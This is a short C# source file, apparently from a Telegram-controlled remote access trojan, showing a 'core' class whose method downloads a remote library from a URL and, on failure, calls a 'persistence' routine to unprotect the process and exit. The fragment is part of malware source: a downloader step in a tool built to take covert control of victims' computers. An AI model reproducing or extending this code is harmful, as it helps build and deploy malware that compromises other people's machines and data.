using System;
using System.IO;
using System.Net;

namespace TelegramRAT;

internal sealed class core
{
	public static void LoadRemoteLibrary(string url)
	{
		if (!File.Exists(Path.GetFileName(url)))
		{
			try
			{
				new WebClient().DownloadFile(url, Path.GetFileName(url));
			}
			catch (WebException)
			{
				Console.Write("[!] Failed load libraries, not connected to internet!");
				persistence.unprotectProcess();
				Environment.Exit(1);
			}
		}
	}
}
